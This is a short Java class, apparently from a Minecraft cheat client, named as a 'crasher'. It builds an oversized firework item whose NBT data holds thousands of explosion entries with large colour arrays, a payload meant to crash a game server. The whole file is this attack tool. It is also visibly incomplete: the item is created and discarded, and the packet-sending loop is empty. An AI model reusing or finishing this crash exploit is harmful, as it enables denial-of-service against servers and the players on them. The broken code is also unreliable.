public class PlaceFireworkCrasher {
   public static double packets = 10.0D;

   public static void start() {
      new ItemStack(Items.FIREWORKS);
      NBTTagCompound outerTag = new NBTTagCompound();
      NBTTagCompound tag2 = new NBTTagCompound();
      NBTTagList list2 = new NBTTagList();
      int[] arr = new int[64];

      int e;
      for(e = 0; e < 3260; ++e) {
         Arrays.fill(arr, e + 1);
         NBTTagCompound explosion = new NBTTagCompound();
         explosion.setIntArray("Colors", arr);
         list2.appendTag(explosion);
      }

      tag2.setTag("Explosions", list2);
      tag2.setByte("Flight", (byte)2);
      outerTag.setTag("Fireworks", tag2);

      for(e = 0; (double)e < packets; ++e) {
      }

   }
}
